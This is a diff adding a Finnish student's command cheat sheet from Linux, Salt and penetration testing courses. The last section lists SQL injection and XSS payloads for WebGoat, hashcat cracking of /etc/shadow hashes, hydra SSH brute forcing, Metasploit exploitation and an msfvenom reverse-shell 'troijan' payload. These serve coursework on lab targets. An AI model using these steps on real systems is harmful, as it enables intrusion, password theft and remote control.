@@ -1,0 +1,550 @@
+_____________________________________________________________________________________________________
+
+Linux Palvelimet komentoja
+_____________________________________________________________________________________________________
+*** ALKU KOMENNOT ***
+setxkbmap fi		<--->	Vaihtaa suomi nappaimiston
+sudo apt-get update	<--->	Tuo palvelimelle versio tiedot
+sudo apt-get upgrade	<--->	Päivittää ohjelmistoja
+uname -a		<--->	Kayttojarjestelman versio
+lshw -short -sanitize	<--->	Laitteisto
+ifconfig		<--->	Ip tietoja
+passwd			<--->	Salasana xubuntu live tikulle
+_____________________________________________________________________________________________________
+*** WIRELESS ADAPTERIN ASENNUS ***
+iwconfig					<--->	Tietoja langatomasta adapterista	
+sudo apt-get install bcmwl-kernel-source	<--->	Lataa langatoman adapterin
+_____________________________________________________________________________________________________
+*** KANSIOT LINUXIIN ***
+ls			<--->	Listaa hakemiston tiedostot
+ls -a			<--->	Listaa myos hidden folderit
+ls -l			<--->	Nayttaa oikeudet
+pwd			<--->	Listaa taman hetkisen hakemiston
+mkdir kansionnimi	<--->	Luo kansion
+nano text.txt		<--->	Luo teksti tiedoston
+cd var			<--->	Menee tiettyyn tiedostoon esim cd var menee var kansioon
+cd			<--->	Pelkka cd menee takaisin home kansioon
+cd ..			<--->	Menee takaisin pain hakemistossa
+less			<--->	Haku komento, joka tuo yhdensivun kerralla
+etc			<--->	kaikki asetukset
+find			<--->	hakee tiedostoja
+mv oldname newname	<--->	Vaihtaa tiedoston nimen
+rm tiedosto		<--->	Poistaa tiedoston
+sudo rm -r kansio	<--->	Poistaa kansion
+mv tiedostonnimi kansio/<--->	Vie tiedoston toiseen kansioon
+cp tiedostonnimi kansio/<--->	Kopioi tiedoston toiseen kansioon
+man ls			<--->	Tuo terminaaliin ohjekirjan ls toiminnosta
+history			<--->	Nayttaa vanhat kommennot
+/var/log/auth.log	<--->	Kirjautumis loki kansio
+fg			<--->	Tuo ctrl+Z suljetun tiedoston takaisin
+_____________________________________________________________________________________________________
+*** HAKUTOIMINTO *** 
+grep nimi		<--->	 Hakee tietueesta hakusanalla
+grep -ir		<--->	 Ir on textin luku ohjelma
+
+tail tietueennimi -F	<--->	 Avaa tietueen 10viimeista rivia ja -F paivittaa tietoja
+
+| putki merkki		<--->	 Liimataan komentoja 
+
+_____________________________________________________________________________________________________
+*** TIEDOSTOJEN LATAUS ***
+sudo apt-get update			<--->	Paivittaa tamanhetkiset ohjelmisto versiot
+apt-cache search ohjelmannimi		<--->	Etsii ohjelmistoja
+sudo apt-get install ohjelmannimi	<--->	Asentaa ohjelmiston
+sudo apt-get remove ohjelmannimi	<--->	Poistaa ohjelmiston
+sudo apt-fer purge ojelmnnimi		<--->	Poistaa ohjelmiston ja asetukset
+_____________________________________________________________________________________________________
+*** OHJELMIA ***
+sudo apt-get install	<--->	Turvallinen tapa asentaa ohjelmia
+shutter			<--->	Snappintool
+gimp			<--->	Kuvan muokkaus
+nautilus		<--->	Tiedonhallinta jossa FTP
+clawAv			<--->	Virusturva
+clawTk			<--->	Clamav graafinen kayttoliittyma
+deluge			<--->	Torrent
+vlc			<--->	Videon toisto
+apache2			<--->	Apache2
+
+sudo snap-install	<--->	 Ei niin turvallinen tapa asentaa ohjelmia
+Discord			<--->	 VoIP
+
+_____________________________________________________________________________________________________
+*** LINUX PIKA NAPPAIN ***
+CTRL + C		<--->	Yleisesti sulkee ohjelmia
+WINDOWS + T		<--->	Avaa terminaalin
+WINDOWS + Z		<--->	Sammuttaa toimintoja ilde tilaan takaisin "fg"
+_____________________________________________________________________________________________________
+*** APACHE, UFW PALOMUURI JA PHP ***
+sudo ufw enable					<--->	Palomuuri paalle, jos etayhteys paallä ssh yhteys voi katketa
+sudo ufw allow 22/tcp				<--->	Ssh paalle
+sudo ufw allow 80/tcp				<--->	Html portti paalle
+sudo ufw status vebose				<--->	Tulimuurin status ja verbose luottavassa muodossa
+ssh a1800@myy.haaga-helia.fi			<--->	SSH yhteys haagaheliaan
+sudoedit index.html				<--->	Sudo oikeuden editointi
+echo hei					<--->	Echo testi
+echo hei | sudo tee /var/www/html/index.html	<--->	Korvaa apache testisivun sanalla hei
+sudo a2enmod userdir				<--->	Oikeudet kayttajille
+chmod ugo+rwx					<--->	Read write ja execute oikeus kaikkille
+
+/home/xubuntu/public_html/index.htlm		<--->	Html sivun koti hakemisto
+http://localhost/~xubuntu/			<--->	Mozilla firefox hakee sivun
+systemctl restart apache2			<--->	Uudelleenkäynnistää apachen2
+
+vaida index.php					<--->	Jotta saadaan php kayttoon vaihdataan nimi
+apache2 ja php					<--->	Tarvittavat ohjelmat
+libapache2-mod-php				<--->	Php apacheen
+cd/etc/apache2/					<--->	Asetukset
+etc						<--->	Yleinen asetus kansio
+grep -ir php					<--->	Hakee grepila php
+nano						<--->	Normaali kayttajan teksti editori
+sudoedit					<--->	Sudo kayttaja editori
+grep -i -r php					<--->	Hakee grep php
+<?php print(1+1)?>				<--->	Esimerkki php koodista jos HTML sivule tulee 2 php on paalle
+sudo ufw allow 22/tcp				<--->	Palomuuri auki portille 22/tcp
+_____________________________________________________________________________________________________
+*** SSH ROOT JA KAYTTAJIEN LUONTI ***
+sudo apt-get install -y openssh-client openssh-server
+
+hostname -I					<--->	Koneen Ip osoite 4 ja 6
+ssh root@104.248.26.65				<--->	Aluksi yhteys root kayttajalla
+ssh user@dunttus.com -p 2121			<--->	Jos SSHn portti vaihdettu
+
+sudo adduser joni				<--->	Luo kayttajan joni
+sudo adduser joni sudo				<--->	Lisaa kayttajalle joni sudo oikeuden
+sudo adduser joni admin				<--->	Lisaa kayttajan joni admineihin
+sudo userdel joni				<--->	Poistaa kayttajan
+
+sudo usermod --lock root			<--->	Lukitsee root salasanan
+etc/ssh/sshd_config				<--->	SSH asetuksin kansio
+sudoedit sshd_config				<--->	PermitRootLogin vaihdetaan taalta "no"
+sudo service ssh restart			<--->	SSH uudelleen käynnistys = asetukset tulee voimaan
+host dunttus.com dnsl.registrar-server.com	<--->	Talla voidaan katsoa hostin tietoja
+sudo a2ensite dunttus-com.conf			<--->	Lisaa tiedoston conf tiedostoon
+netstat	-tulpn					<--->	Avoin portti
+_____________________________________________________________________________________________________
+*** JULKINEN JA SALAINEN AVAIN ***
+ssh-keygen			<--->	Luo julkisen ja salaisen avaimen
+ssh-copy-id joni@localhost	<--->	Kopioi local hostiin avaimen
+
+Enter file in which to save the key (/home/xubuntu/.ssh/id_rsa):	<--->	Salainen avain
+
+rsa.pub julkinen avain							<--->	Julkinen avain
+
+_____________________________________________________________________________________________________
+*** TIEDONSIIRTO ***
+RSYNC
+rsync nimi.txt joni@dunttus.com:			<--->	Tekstin kopiointi
+rsync -vazh --progress kansio joni@dunttus.com		<--->	v - komento vastaa h - human readeble
+
+GITHUB
+git clone https://github.com/Dunttus/portfolio.git	<--->	Oman git sivun cloonaus linkki
+
+SSHFS
+sshfs user@104.248.26.65: kansio:			<--->   Graaffinen valikointi
+fusermount -u kansio					<--->   Irrottaa mount pointin
+
+
+_____________________________________________________________________________________________________
+***PROSESSIEN ANALYSOINTI***
+top				<--->	Tietoja kuormituksesta
+uptime				<--->	Kurmituksen kehitys arvo
+nproc				<--->	Ytimet prosessorissa
+
+dstat				<--->	Verkkoliikenteen seuranta ohjelma
+nethogs				<--->	Verkkoliikenteen seuranta ohjelma
+netstat				<--->	Valmiiksi asennettu ohjelma verkon seuranta ohjelma
+dstat				<--->	Verkkoliikenteen seuranta ohjelma
+
+free -h				<--->	RAM muisti
+sudo iotop -oa			<--->	Levytilan kulutus
+sysstat	| grep			<--->	Kerää lokitietoja
+etc/default/sysstat		<--->	ENABLED="true" asetuksista päälle
+sar				<--->	Tietoa prosessorin kaytosta
+systemctl restart		<--->	Jos ei toimi palvelun uudelleen kaynnistys
+systemctl status		<--->	Ohjelman status
+
+ps waux | less			<--->	prosessi lista
+waux | grep -i xclock		<--->	prosessi numero
+kill 123prosessinumero123	<--->	tappaa prossessin numeron perusteella
+pstree -Up | less		<--->	prosessi puu
+
+hostname -l
+
+df -ah				<--->	Paljon disk tilaa jäljellä
+_____________________________________________________________________________________________________
+*** SCRIPTIT ***
+echo "hei joni"			<--->	Kirjoitaa hei joni
+nano hei.sh			<--->	Luo scriptin
+bash hei.sh			<--->	Avaa scriptin
+#!/bin/bash			<--->	Oletus komento tulkki teksti tiedostoon
+ls -l hei.sh			<--->	Nayttaa oikeudet tiedostosta hei.sh
+-rwx-rwx-rwx			<--->	Dir tai - eli tavallinen tiedoston read write execute
+chmod u+rw hei.sh		<--->	User read ja write oikeudet tiedostolle hei.sh
+chmod ugo+x hei.sh		<--->	Kaikkille oikeudet execute
+ls /usr/local/bin/		<--->	Kansio kaikkille kayttajille
+
+which bash			<--->	Kertoo mistä bash ajetaan
+
+nano hei.py			<--->	Luo teksti tiedoston johon voidaan kirjoittaa pyhthonia
+phython3 hei.py			<--->	Avaa phythonin tulkin
+CTRL+D				<--->	Sulkee phytonin
+print("heii")			<--->	Tulostaa heii
+HELLOWORLD KARVINEN java go ja c kielet
+_____________________________________________________________________________________________________
+*** SSH PROXY ***
+hostname -I			<--->	Nayttaa ipn
+SOCK5				<--->	SSH proxy ominaisuuden nimi
+ssh -D 2020 nimi@osoite		<--->	SSH proxy yhteys tahan tarvitaan viela firefox asetukset
+nc -vz localhost 9080		<--->	Portin avaus nc=netcat
+Firefox				<--->	Firefox asetuksista manual proxy vain SOCKS host = localhost
+FoxyProxxy			<--->	Jos monta proxya
+_____________________________________________________________________________________________________
+*** GOOGLE SCHOLAR ***
+settings			<--->	Kieli Englanti, library links Haaga-Helia
+
+_____________________________________________________________________________________________________
+*** KÄYTTÄJÄT *** 
+jhakala tai joni		<--->	Esimerkki käytäjä, max 8merk, a-z, alkaa kirjaimella.
+pavahx6Ousoh			<--->	Hyvä alkusalasan on random ja kirjoitetaan muistiin. 
+nano salasanat.txt		<--->	Salasana kansio
+ls -ld salasanat.txt		<--->	Oikeudet
+chmod og-rwx salasanat.txt	<--->	Poistaa oikeudet read write execute
+sudo adduser joni		<--->	Luo käyttäjän joni
+pwgen 12 2			<--->	Generoi 12 merkkin salasanan 2 kertaa
+_____________________________________________________________________________________________________
+*** MARIADB ***
+Asennus:
+sudo apt-get install mariadb-client mariadb-server
+
+Kayttajan luonti:
+GRANT ALL ON databasenimi.* TO käyttäjännimi@localhost IDENTIFIED BY 'salasana';
+
+Kirjautuminen:
+mariadb --user=käyttäjännimi --password
+
+SOURCES:
+Pohjana Tero Karvinen 2012: Linux kurssi, http://terokarvinen.com
+
+
+
+*****************************************************************************************************
+*****************************************************************************************************
+
+_____________________________________________________________________________________________________
+
+Palvelinten Hallinta komentoja
+_____________________________________________________________________________________________________
+
+** SALT **
+sudo apt-get -y install salt-master     <--->   Asentaa salt masterin
+sudo apt-get -y install salt-minion     <--->   Asentaa salt orjan
+
+sudoedit /etc/salt/minion               <--->   Kansio johon lisataan masterin ip
+master: 10.0.0.0                        <--->   Salt master rivi tiedostossa minion
+id: orjaid				<--->	Orjalle id minion tiedostoon mastrin alle 
+systectl restart salt-minion            <--->   Uudelleen kaynnistaa salt minionin
+
+sudo salt-key                           <--->   Näyttää masterille lisätyt kayttajat
+sudo salt-key -A                        <--->   Ottaa vastaan kaikki käyttäjät
+sudo salt-key -d user			<--->	Poistaa tietyn käyttäjän
+
+sudo salt '*' cmd.run 'whoami'          <--->   Lahettaa minionille terminaali komennon whoami
+sudo salt '*' grains.items              <--->   Kysyy orjilta tietoja
+sudo salt '*' pkg.install apache2       <--->   Asentaa orjalle paketin apache2
+sudo salt '*' sys.doc|less              <--->   Generoi saltista dokumentin
+
+ _______________________
+|srv/salt/top.sls       |               <--->   tunti harjoitus top.sls tiedoston sisältö
+|base:                  |
+|  '*':                 |
+|    - hello            |
+|  'nimi':              |
+|    - webdev           |
+|_______________________|
+ _______________________
+|/tmp/webdev.txt:       |		<--->   init.sls tiedoston sisältö
+|  curl:                |
+|    pkg.installed      |
+|  apache2              |
+|    pkg.installed      |
+|_______________________|
+
+sudo salt '*' sys.state_doc             <--->   Generoi documentin koneelle
+
+
+/var/lib/salt/pki/minion/minion_master.pub      <--->   Orja koneen kansiossa palvelimen julkinen avain
+nc -vz ip portti                                <--->   Yhden portin scannaus netcatilla
+_____________________________________________________________________________________________________
+**FIND KOMENTO**
+sudo find -printf "%T+ %p\n"|sort			<--->   Kertoo asennetujne ohjelmien ajan jarjesteksyssa
+sudo find -printf '%T+ M %p\n%A+ A %p\n%C+ C %p\n'|sort	<--->	Kertoo asennettujen ohjelmien ajan jarjestyksessa
+_____________________________________________________________________________________________________
+**GIT VERSIO HALLINTA**
+git init nimi                           <--->   Alku kansion luonti paikkallisesti
+git add .                               <--->   Valmistaa kaikki tiedostot committia varten
+git commit -m "kommentti"               <--->   Vie kaikki muutokset lopuliseen tyohon mukaan
+git log                                 <--->   Tuo commit lokin ruudulle
+git config --global user.email "@"      <--->   Lisaa kayttajalle emalin commitiin
+git config --global user.name "Nimi"    <--->   Lisaa kayttajalle nimen committiin
+
+git diff				<--->   Naytaa miten tiedostoa vaihdettu
+git diff --cached			<--->   Valimuistin tiedoston vaihdot
+git reset --hard			<--->   Menee takaisinpäin versioissa merkilla # voi kommentoida
+
+git clone URL				<--->   Kopioi repositoryn omalle koneelle
+pull push				<--->   Ensin pull sitten push
+Kommentit Eng				<--->   Git kommentit aina Englaniksi
+meld tool				<--->   Mergin tool git tiedostoille
+git rm					<--->   Git poisto komento
+
+sudo git add .; sudo git commit -a -m "COMMENT"; sudo git pull; sudo git push
+sudo git add . && sudo git commit -a -m "COMMMENT" && sudo git pull && sudo git push
+_____________________________________________________________________________________________________
+** VirtualBox Vagrant **
+sudo apt-get install vagrant            <--->   Vagrantin asennus paketti
+sudo apt-get install virtualbox-qt      <--->   Virtualbox asennus paketti
+vagrant cloud bento valmis vm           <--->   Valmiiden vagrant koneiden asennus tiedostot
+vagrant init ubuntu/trusty64            <--->   Esimerkki joka luo ubuntun benton valmiista paketista
+vagrant up                              <--->   Asentaa vagrantin Vagrantfilen avulla
+vagrant ssh                             <--->   Vagrant koneelle paasee ssh yhteydella
+vagrant destroy                         <--->   Tuhoaa vagrant koneen
+_____________________________________________________________________________________________________
+** SALT WINDOWS **
+salt-master --version                                   <--->   Linux herran Salt masterin versio
+sudo salt '*' cmd.run 'ipconfig' shell=powershell       <--->   Saltin kautta powershell komentoja
+sudo salt '*' cmd.run ipconfig                          <--->   Saltin kautta cmd komentoja
+
+ ___________________________________________
+|C:\testi.txt:                              |           <--->   testi.sls tiedosto Windows C:\ kansioon
+|  file.managed:                            |
+|    - source: salt//testiwindows/testi.txt |
+|___________________________________________|
+
+sudo mkdir /srv/salt/win                                <--->   Windows paketin hallinta kansio
+sudo chown root.salt /srv/salt/win                      <--->   Kansio saattaa tarvita Salt kayttajalle omistajuuden
+salt-run winrepo.update_git_repos                       <--->   Alustaa Salt-masterin paketin hallinta arkiston
+salt -G ‘os:windows’ pkg.refresh_db			<--->   synkronisoi pkg pakettivaraston myos Windows:in puolelle
+sudo salt 'orja' pkg.purge firefox                      <--->   Paketin remote poisto windosilta
+
+sudo salt -G 'os:windows' pkg.refresh_db                <--->   Salt komento joka kohdennettu windows os
+
+scp -P 2020 -r "tiedosto" joni@104.248.26.65:/home/joni <---> Tiedon siirto Windows feature bashilta portiin 2020
+
+SOURCES:
+Pohjana Tero Karvinen 2012: Palvelinten hallinta kurssi, http://terokarvinen.com
+Window Salt repo 2019: https://docs.saltstack.com/en/latest/topics/windows/windows-package-manager.html
+
+
+*****************************************************************************************************
+*****************************************************************************************************
+
+!!! Penetration Testing kohdan käytetyt menetelmät ovat väärin käytettynä laittomia, käytä omalla vastuulla. !!!
+_____________________________________________________________________________________________________
+
+Penetration Testing
+_____________________________________________________________________________________________________
+** Muistio **
+
+Intrusion kill chain
+Mitre att&ck
+Openwire bandit
+Hack the box eu
+metasploit3
+mitmproxy
+foxyproxy
+yleisimmät salasanat itse tehty sanalista
+geoipblocking
+jsnice
+ghidra
+sysinternals
+RSA, Disobey, Black Hat
+/etc/shadow
+ooda loop
+teronpentest salasana
+pentestmonkey net reverse shell cheat sheet <---> tty
+censys
+shodan
+maltego
+________________________________________________________________________________________________
+** Xubuntu pentest alkeet **
+rmmod pcspkr                                    <--->   Piip ääni pois
+apt-cache search pentest                        <--->   Xubunulla haku
+nmap localhost                                  <--->   Portti scanneri
+nmap -A localhost                               <--->   Banner grab
+
+virtualenv python3-pip                          <--->   Asennus Xubuntulle
+mkdir mitm
+virtualenv env -p python3
+source env/bin/activate
+pip install mitmproxy                           <--->   Asennus Xubuntulle
+
+
+nc -vz localhost 80                             <--->   Portti scannaus 1portti Verbose Zero
+Kali Linux Xfce 64-bit                          <--->   OS
+CTRL+ALT+F7                                     <--->   Jos Kali ei avaudu lepotilasta
+
+apt-get install docker.io                       <--->   Paketin hallinta paketti
+docker pull webgoat/webgoat-7.1                 <--->   Tuo config tiedoston webgotille
+docker run -p 8080:8080 -t webgoat/webgoat-7.1  <--->   Ajaa config tiedoston webgoatille
+newgrp docker                                   <--->   Avaa bash shellin uudella dockerille
+localhost:8080/WebGoat                          <--->   Selaimella
+
+echo "salasana"|sha256sum                       <--->   Salasana terminaaliin salattuna sha256
+
+________________________________________________________________________________________________
+** MitmProxy **https://youtu.be/q1jwwJFpB_A
+EDITOR=nano mitmproxy -p 8888                   <--->   jos portti käytössä
+localhost 8888                                  <--->   Manual HTTP proxy Firefox asetus ja 127 poistetaan
+Shift+K                                         <--->   Pika nappainten haku
+m                                               <--->   merkkaa
+e                                               <--->   Valikko
+tab                                             <--->   Tallentaa muutokset
+r                                               <--->   Reload page
+Shift+F                                         <--->   Seuraa uusia tiloja
+m                                               <--->   Voi vaihtaa kieltä sivulla esim css tai javascript
+f                                               <--->   Filter expressions mitmproxy
+i                                               <--->   Intersept=nimi näppäin "a" eteen päin 1askel
+shift+a                                         <--->   Intercept tilassa päästä kaikki loput läpi
+
+________________________________________________________________________________________________
+** WebGoat **
+POST ../../../../../WEB-INF/spring-security.xml <--->   Tehtävä bypass a path based access fire fox inspector
+POST action DeleteProfile                       <--->
+SelectProfile --> DeleteProfile                 <--->
+User id 105 --> 104                             <--->
+450000                                          <--->
+<IMG SRC="location"/>                           <--->   stage 1
+<IMG SRC = "error" onerror= "alert">            <--->   stage 2
+<IFRAME SRC ="javascript:alert('XSS');"         <--->   stage 3
+<div></div>                                     <--->   stage 4
+
+SQL injectiot
+Account Name:_____ Get Account Info
+user' or 1=1--
+
+Name ID:_____ Get Account Info
+'101' or 1=1--
+
+Name:___ Get Account
+Pass:___ Check password
+'select*from user_system_data--
+table name user_system_data
+
+
+Activate SUBMIT disabled -> enabled             <--->
+
+________________________________________________________________________________________________
+** Nmap **
+ip route
+ipcalc 10.0.0.0
+
+nmap -n -vvv 10.10.10.1-254 --top-ports 10 | tee portscan.txt
+nmap -n -sV -sC -Pn 10.10.10.10 | tee 10portscan.txt
+
+-sV                                     <--->   Bannerit eli versiotiedot
+alt+.                                   <--->   viimeisen komennon viimeinen sana
+loppuun -oA nimi                        <--->   Tekee suoraan tiedostot scannauksien tiedoista
+loppuun -sU                             <--->   UDP
+nmap -n 10.10.10.1-254 -p 80,443        <--->   scannaa ip alueen portit 80 ja 443
+-sn                                     <--->	
+-Pn                                     <--->   no ping
+--top-ports 10                          <--->   Skanna 10 suosituinta porttia
+-sC					<--->	Scripti skannaus
+________________________________________________________________________________________________
+** MetaSploit **
+msfdb init              <--->   Ajetaan kerran
+msf                     <--->   Kaikki komennolt alkaa
+msfconsole              <--->   Avaa Metasploit 5 konsolin
+help                    <--->   Avaa helpin
+db_nmap localhost       <--->   Nmap metasploitissa
+db_nmap help            <--->   Help sivu nmapille
+hosts                   <--->   Kaikki hostit
+services --up           <--->   Kaikki servicet tietokannasta --up poistaa filtered
+search node.js          <--->   etsii
+searchsploit ftp        <--->   Etsii exploiteja
+use linkki              <--->   Kaytetaan avaamaan exploit
+--help                  <--->   help flag esim services komentoon
+msfpc|less --raw
+-R                      <--->   Vaarallinen flagi RHOST asettaa kaikki tiedoston koneet maaliksi
+set                     <--->   Listaa RHOST maalit
+set RHOSTS 10.0.0.0     <--->   Yli ajaa RHOST tiedoston yhdellä maalilla
+
+________________________________________________________________________________________________
+** EyeWitness **
+eyewitness -f /root/ey/hosts            <--->   EyeWitness toiminto hosts tiedostoon tarvitaan domain tai ip
+--web --prepend-https                   <--->   Liput jotka hakee webbisivusta myös https
+hosts                                   <--->   Listataan kansioon hostnimi tai ip
+
+________________________________________________________________________________________________
+** Meterpreter **
+install metaspoit-framework                     <--->   Päivittää explotit metasploitiin
+vagrant rapid7                                  <--->   vagrant tiedoston nimi
+nano vagrantfile copy paste kurssi sivulta      <--->
+vagrant up                                      <--->   Avaa vagrantfilen kautta koneen
+ip route                                        <--->   Näyttää ip aluetta
+ipcalc                                          <--->   Laskee IP alueen
+-sn ip -n -sV                                   <--->   nmap lippuja
+set RHOSTS ip                                   <--->   Maalitaulu koneen IP
+
+search vsftp                                    <--->   Etsii haavoituvuuksia
+use /kansio/kansio/                             <--->   Käyttää haavoituvuutta nimenmukaan
+back ja options                                 <--->   valintoja use:ssa
+show payloads                                   <--->   näyttää payloadit
+set payload cmd/unix/                           <--->   explotin valinta
+exploit                                         <--->   Lähettää exploit paketin
+
+help                                            <--->   Antaa eri toimintoja
+background                                      <--->   Vie session taustalle
+sessions numero                                 <--->   Avaa session taustalta
+set SESSION 1                                   <--->   Targettaa session numeron mukaan
+search upgrade                                  <--->   Etsii ylennys toimintoa
+use /kansio                                     <--->   Käyttää ylennys toimintia set sessioon
+meterpreter                                     <--->   Hyva terminaali ohjelmisto
+exloit                                          <--->   Lähetää ylennys pyynnon Sessioon
+
+MeterPreter: download /file/path		<--->	Lataa tiedostoja target koneesta
+MeterPreter: upload /file/path			<--->	Lataa tiedostoja target koneelle
+
+Portit pitää avata localkoneesta
+________________________________________________________________________________________________
+** HashCat **
+hashcat -m --force /root/hash/md5.txt /usr/share/wordlists/fasttrack.txt        <--->   hc md5 esim
+--show                                                                          <--->   Jos salasana jo crackatty
+echo -n 'salasana' | md5sum | tee -a tiedosto.txt                               <--->   Ei ylikirjoita vaan jatkaa tiedostoa
+tar -xvf                                                                        <--->   Avaa tar tiedostoja
+gunzip rockyou.txt.gz                                                           <--->   Avaa rockyou listan
+free 50000 words terokarvinen                                                   <--->   Sanalista suomi eng
+grep user /etc/shadow                                                           <--->   Linux salasana esim sha512
+$6$                                                                             <--->   Kertoo salauksen
+hashcat -m 1800 -a 0 '$6$'ifuhwapuifh sanalista                                 <--->   hc esim sha512
+man crypt                                                                       <--->   $6$ merkki salauksen tarkoitus
+s                                                                               <--->   Näkee eteenpäin scannauksen aikana
+________________________________________________________________________________________________
+** THCHydra **
+hydra -l user -P sanalista 10.10.10.10 -t 4 ssh -V              <--->   SSH:n kautta yrittää aravata tietyn käyytäjän salasanaa
+hydra -L loginuserfile                                          <--->   Kokeilee kaikilla käyttäjillä jotka sanalistassa
+systemctl restart ssh                                           <--->   Jos ei toimi restart
+hydra http form                                                 <--->   Googlesta löytää web formeihin esimerkkejä
+________________________________________________________________________________________________
+** msfvenom **
+msfvenom --list payloads | grep -i linux        <--->   Hakee hyötykuormia
+msfvenom --list formats
+msfvenom --payload linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 -f elf -o troijan
+
+file troijan                            <--->	
+search multi handler                    <--->	
+use exploit/multi/handler               <--->	
+options                                 <--->	
+set payload linux/x64 meter....         <--->	
+set LHOST 127.0.0.1                     <--->	
+exploit                                 <--->	
+./troyan                                <--->	
+fg					<--->	
+
+
+
+Pohjana Tero Karvinen 2019: Penetration Testing kurssi, http://terokarvinen.com
+
+
+*****************************************************************************************************
+*****************************************************************************************************
